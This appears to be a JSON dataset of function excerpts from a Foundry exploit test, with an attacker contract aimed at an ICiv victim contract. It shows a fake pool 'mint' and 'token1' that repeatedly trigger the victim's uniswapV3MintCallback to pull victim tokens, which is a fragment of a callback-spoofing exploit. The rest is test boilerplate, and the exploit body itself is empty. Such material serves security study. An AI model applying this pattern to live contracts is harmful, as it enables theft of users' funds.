[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "mint",
    "original_code": "    function mint(\n        address recipient,\n        int24 tickLower,\n        int24 tickUpper,\n        uint128 amount,\n        bytes calldata data\n    ) external returns (uint128 amount0, uint128 amount1) {\n        if (counter == 0) {\n            uniswapV3MintCallback(0);\n        } else if (counter == 1) {\n            uniswapV3MintCallback(1);\n        } else if (counter == 2) {\n            uniswapV3MintCallback(2);\n        } else if (counter == 3) {\n            uniswapV3MintCallback(3);\n        } else if (counter == 4) {\n            uniswapV3MintCallback(4);\n        } else if (counter == 5) {\n            uniswapV3MintCallback(5);\n        } else if (counter == 6) {\n            uniswapV3MintCallback(6);\n        } else if (counter == 7) {\n            uniswapV3MintCallback(7);\n        } else if (counter == 8) {\n            uniswapV3MintCallback(8);\n        } else if (counter == 9) {\n            uniswapV3MintCallback(9);\n        } else if (counter == 10) {\n            uniswapV3MintCallback(10);\n        } else if (counter == 11) {\n            uniswapV3MintCallback(11);\n        } else if (counter == 12) {\n            uniswapV3MintCallback(12);\n        } else if (counter == 13) {\n            uniswapV3MintCallback(13);\n        } else if (counter == 14) {\n            uniswapV3MintCallback(14);\n        } else if (counter == 15) {\n            uniswapV3MintCallback(15);\n        } else if (counter == 16) {\n            uniswapV3MintCallback(16);\n        } else if (counter == 17) {\n            uniswapV3MintCallback(17);\n        } else if (counter == 18) {\n            uniswapV3MintCallback(18);\n        } else if (counter == 19) {\n            uniswapV3MintCallback(19);\n        } else if (counter == 20) {\n            uniswapV3MintCallback(20);\n        } else if (counter == 21) {\n            uniswapV3MintCallback(21);\n        } else if (counter == 22) {\n            uniswapV3MintCallback(22);\n        } else if (counter == 23) {\n            uniswapV3MintCallback(23);\n        } else if (counter == 24) {\n            uniswapV3MintCallback(24);\n        } else if (counter == 25) {\n            uniswapV3MintCallback(25);\n        } else if (counter == 26) {\n            uniswapV3MintCallback(26);\n        } else if (counter == 27) {\n            uniswapV3MintCallback(27);\n        } else if (counter == 28) {\n            uniswapV3MintCallback(28);\n        } else if (counter == 29) {\n            uniswapV3MintCallback(29);\n        } else {\n            uniswapV3MintCallback(30);\n        }\n        ++counter;\n        return (10, 11);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 17_646_141);\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(BONE), \"BONE\");\n        cheats.label(address(LEASH), \"LEASH\");\n        cheats.label(address(SANI), \"SANI\");\n        cheats.label(address(ONE), \"ONE\");\n        cheats.label(address(CELL), \"CELL\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(SHIB), \"SHIB\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "token1",
    "original_code": "    function token1() external view returns (address) {\n        return address(victimsAssets[counter]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ICiv",
    "source_type": "victim_contract",
    "function_name": "uniswapV3MintCallback",
    "original_code": "",
    "description": ""
  }
]